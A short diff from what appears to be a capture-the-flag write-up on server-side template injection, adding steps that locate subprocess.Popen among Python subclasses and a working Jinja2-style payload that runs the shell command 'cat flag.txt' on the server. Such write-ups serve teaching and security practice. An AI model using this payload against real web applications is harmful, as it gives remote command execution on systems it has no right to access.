@@ -24,3 +24,12 @@ request
 ```
 
 The subprocess.Popen class allows us to run os commands and is of interest.
+```
+python3 extract_subclass_num.py subclasses subprocess
+413:  <class 'subprocess.CompletedProcess'>
+414:  <class 'subprocess.Popen'>
+```
+3. Running OS commands
+```
+{{ [].__class__.__base__.__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
+```
